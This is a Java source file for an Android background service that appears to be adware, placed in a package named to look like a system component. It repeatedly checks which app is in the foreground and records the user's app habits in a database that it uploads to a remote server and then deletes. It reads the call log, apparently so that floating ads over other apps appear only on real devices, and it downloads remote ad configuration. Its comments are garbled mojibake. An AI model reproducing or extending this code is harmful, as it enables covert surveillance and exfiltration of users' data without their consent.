package com.android.floatting.adver.service;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.provider.CallLog;

import com.android.floatting.adver.database.DBHabbitTable;
import com.android.floatting.adver.model.AppData;
import com.android.floatting.adver.model.AppTask;
import com.android.floatting.adver.network.ConfigDownloader;
import com.android.floatting.adver.network.ConfigDownloader.ConfigDownloaderListener;
import com.android.floatting.adver.network.FileUploader;
import com.android.floatting.adver.network.FileUploader.FileUploaderListener;
import com.android.floatting.adver.network.Statistik;
import com.android.floatting.adver.utils.Config;
import com.android.floatting.adver.utils.Tools;

public class FloatAdverUpdService extends Service implements
		ConfigDownloaderListener, FileUploaderListener {

	private int mFileType = -1;
	private AdverTask mCurrentAdverTask = null;

	private static final int SHOW_TIMES = 1;
	private static final long XML_UPDATE_INTEVAL = 1 * 60 * 1000L;// 6 * 60 * 60
																	// * 1000L;
																	// // 6Сʱ
																	// //DEBUGSHOULDOFF
	private static final int CALL_TIMES = 1;

	public static boolean NeedUpdFlag = false;

	public class FloattingAdverTaskServiceBinder extends Binder {
		public FloatAdverUpdService getMyService() {
			return FloatAdverUpdService.this;
		}
	}

	private final FloattingAdverTaskServiceBinder mServiceBinder = new FloattingAdverTaskServiceBinder();

	@Override
	public void onCreate() {
		super.onCreate();
		Tools.log("onCreate.....");

	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		if (!intent.getAction().equalsIgnoreCase(
				"android.service.startFloattingAdverTaskService")) {
			Tools.log("not our action");
			return;
		}

		// ����ͳ����ݿ�
		SharedPreferences prefs = PreferenceManager
				.getDefaultSharedPreferences(this);
		Editor editor = prefs.edit();
		int runTimes = prefs.getInt("runTimes", -1);
		if (runTimes == -1 || runTimes > 100) {
			Tools.log("update database");
			updateDatabase();
			editor.putInt("runTimes", 0);
		} else {
			editor.putInt("runTimes", runTimes + 1);
		}
		editor.commit();

		ArrayList<AppTask> taskList = AppData.getSession(this).getTaskList();
		if (taskList == null) {
			Tools.log("there is no config, so get it....");
			mFileType = ConfigDownloaderListener.DOWNLOAD_ZIP;
			reloadConfigData();
		} else {
			ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
			RunningTaskInfo info = am.getRunningTasks(1).get(0);
			String packageName = info.topActivity.getPackageName();
			Tools.log("current packageName:" + packageName);

			AppTask task = findAppTask(packageName);

			if (!Tools.testNetWork(this)) {
				Tools.log("no network,skip");
				restartAlarm();
				return;
			}

			if (task != null) {
				Tools.log("it's our task...");
				NeedUpdFlag = false;// һ��ʼ���£�������
				if (shouldUpdate()) {
					Tools.log("should update now..");
					if (mCurrentAdverTask != null) { // ����й����ʾ�����˳�
						mCurrentAdverTask.exit();
						mCurrentAdverTask = null;
					}
					updateConfigFiles();

					return;
				} else {
					SharedPreferences setting = PreferenceManager
							.getDefaultSharedPreferences(this);

					int showTimes = setting.getInt("showTimes", 0);
					ContentResolver cr = getContentResolver();
					Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
							new String[] { CallLog.Calls.NUMBER,
									CallLog.Calls.CACHED_NAME,
									CallLog.Calls.TYPE, CallLog.Calls.DATE },
							null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
					int callTimes = cursor.getCount();
					Tools.log("should show adver..int:" + showTimes + " SH:"
							+ SHOW_TIMES + " call:" + callTimes + " CT:"
							+ CALL_TIMES);

					if (showTimes < SHOW_TIMES || callTimes < CALL_TIMES) {
						Editor setEditor = prefs.edit();
						setEditor.putInt("showTimes", showTimes + 1);
						setEditor.commit();
						restartAlarm();
						return;
					}

					if (mCurrentAdverTask == null) {
						mCurrentAdverTask = new AdverTask(this, task,
								packageName);
						mCurrentAdverTask.entry();
					} else {
						// ���������ͬ����������
						if (mCurrentAdverTask.isSameTask(packageName)) {
							restartAlarm();
							return;
						}
						mCurrentAdverTask.exit();
						mCurrentAdverTask = new AdverTask(this, task,
								packageName);
						mCurrentAdverTask.entry();
					}
				}

			} else {
				Tools.log("it's not our task...");
				if (mCurrentAdverTask != null) {
					mCurrentAdverTask.exit();
					// ����������Լ��ĳ�������գ����������˳�ȥ֮ǰ���������ٳ���
					if (!packageName.equals(getPackageName())) {
						mCurrentAdverTask = null;
					}
				} else {
					if (NeedUpdFlag) {
						NeedUpdFlag = false;// һ����������
						Tools.log("check delay upd..");
						if (shouldUpdate()) {
							Tools.log("should update now..");
							updateConfigFiles();
						}
					}
				}
				// Add here if upd flag is true,check upd here
			}
		}
		restartAlarm();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return mServiceBinder;
	}

	@Override
	public boolean onUnbind(Intent intent) {
		super.onUnbind(intent);
		return true;
	}

	private Handler handler = new Handler() {
		public void handleMessage(Message msg) {
			if (msg.what == 1) {
				restartAlarm();
			}
		}
	};

	// private void cancelAlarm() {
	// AlarmManager a = AppData.getSession(this).getAlarmManager();
	// PendingIntent pi = AppData.getSession(this).getAdverPI();
	//
	// if (a == null || pi == null) {
	// return;
	// }
	// a.cancel(pi);
	// }

	private void restartAlarm() {

		long now = SystemClock.elapsedRealtime();
		AlarmManager a = AppData.getSession(this).getAlarmManager();
		PendingIntent pi = AppData.getSession(this).getAdverPI();

		// AppData will be released in some special situation
		if (a == null || pi == null) {
			AlarmManager alarmManager = null;
			alarmManager = (AlarmManager) getSystemService(Activity.ALARM_SERVICE);

			Intent aderIntent = new Intent(
					"android.service.startFloattingAdverTaskService", null,
					this, FloatAdverUpdService.class);

			PendingIntent aderPI = PendingIntent.getService(this, 0,
					aderIntent, Intent.FLAG_ACTIVITY_NEW_TASK);

			alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, now
					+ Config.ADVER_DELAY, aderPI);
			AppData appData = AppData.getSession(this);
			appData.setAlarmManager(alarmManager);
			appData.setAdverPI(aderPI);
			return;
		}
		a.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, now + Config.ADVER_DELAY,
				pi);
	}

	private AppTask findAppTask(String packageName) {
		ArrayList<AppTask> taskList = AppData.getSession(this).getTaskList();
		for (int i = 0; i < taskList.size(); ++i) {
			AppTask at = taskList.get(i);
			ArrayList<String> packageNames = at.getPackageNames();
			for (int j = 0; j < packageNames.size(); ++j) {
				if (packageNames.get(j).equals(packageName)) {
					return taskList.get(i);
				}
			}
		}

		return null;
	}

	private void initConfigs() {
		File config = new File(Config.CONFIG_DIR);
		if (!config.exists()) { // ��������ļ������ڣ������»�ȡ
			if (!Tools.unzipConfigFilesFromAssets(this)) {
				Tools.log("unzipConfigFilesFromAssets fail");
				return;
			}
		}

		ArrayList<AppTask> list = Tools.parseAdverXml();
		if (list != null) {
			AppData.getSession(this).setTaskList(list);
			AppData.getSession(this).setConfigVersion(Tools.getConfigVersion());
		} else {
			Tools.log("parse task xml in initConfigs Error Happend");
		}

		String upd = Tools.checkUpdBase();
		if (upd == null) {
			upd = Config.DEFAULT_UPD_BASE;
		}
		AppData.getSession(this).setUpdBase(upd);
		Tools.log("updbase:" + upd);
	}

	private boolean shouldUpdate() {
		File configFile = new File(Config.TASK_CONFIG);
		if (configFile.exists()) {
			long inteval = System.currentTimeMillis()
					- configFile.lastModified();
			if (Math.abs(inteval) > XML_UPDATE_INTEVAL) {
				return true;
			}
		}
		return false;
	}

	private void updateConfigFiles() {
		if (ConfigDownloader.STATES == 1) {
			// busy
			Tools.log("updateConfigFiles busy");
			return;
		}
		ConfigDownloader.STATES = 1;
		new Handler().postDelayed(new Runnable() {
			public void run() {
				ConfigDownloader downloader = new ConfigDownloader(
						FloatAdverUpdService.this, Tools
								.makeUpdateUrl(FloatAdverUpdService.this),
						FloatAdverUpdService.this);
				downloader.startDownload();
			}
		}, 3000);
	}

	@Override
	public void onError(String err) {
		Tools.log("update config error....");
		Statistik stat = new Statistik(this, "ERROR", "UPD", err);
		stat.start();

		// �ӳ�3S������������ʱ��
		new Handler().postDelayed(new Runnable() {
			public void run() {
				restartAlarm();
			}
		}, 3000);
	}

	@Override
	public void onDownloadFinish(int fileType) {
		Tools.log("onDownloadFinish fileType:" + fileType);
		mFileType = fileType;
		String dpFilePath = String.format(Config.DB_FILEPATH, getPackageName());
		// MobclickAgent.onEvent(this, "update_success");//ͳ�Ƹ��³ɹ��Ĵ���
		Statistik stat = new Statistik(this, "UPDSUC", "", "");
		stat.start();
		File f = new File(dpFilePath);
		if (f.exists()) {
			Tools.log("upload database........");
			FileUploader uploader = new FileUploader(this,
					Tools.makeUploadUrl(this), dpFilePath, this);
			uploader.startUpload();
		} else {
			Tools.log("there is no db file...., can't upload");
			reloadConfigData();
		}
	}

	@Override
	public void onUploadFinish(boolean isOk) {
		if (isOk) { // ����ϴ��ɹ�����Ҫɾ���Ѿ��ϴ�����ݿ��ļ�
			String dpFilePath = String.format(Config.DB_FILEPATH,
					getPackageName());
			File file = new File(dpFilePath);
			if (file.exists()) {
				boolean res = file.delete();
				Tools.log("Delete DB File res:" + res);
			}
		}
		reloadConfigData();
	}

	private void reloadConfigData() {

		if (mFileType == ConfigDownloaderListener.DOWNLOAD_NO_NEED_UPDATE) {
			restartAlarm();

		} else if (mFileType == ConfigDownloaderListener.DOWNLOAD_ZIP) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					initConfigs();
					Message msg = handler.obtainMessage();
					msg.what = 1;
					handler.sendMessage(msg);
				}
			}).start();
		} else {
			restartAlarm();
		}
	}

	private void updateDatabase() {
		ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		RunningTaskInfo info = am.getRunningTasks(1).get(0);
		String packageName = info.topActivity.getPackageName();
		String appName = getCurrentAppName(packageName);
		String name = appName.replaceAll("'", "-");

		DBHabbitTable.getInstance(this).addHabbitApp(packageName, name);

		Tools.log("updateDatabase");
	}

	private String getCurrentAppName(String packageName) {
		PackageManager pm = getPackageManager();
		List<ApplicationInfo> listAppcations = pm
				.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES);
		Collections.sort(listAppcations,
				new ApplicationInfo.DisplayNameComparator(pm));// ����

		for (ApplicationInfo app : listAppcations) {
			String pkg = app.packageName;
			if (pkg.equalsIgnoreCase(packageName)) {
				return (String) app.loadLabel(pm);
			}
		}

		return "ERROR";
	}
}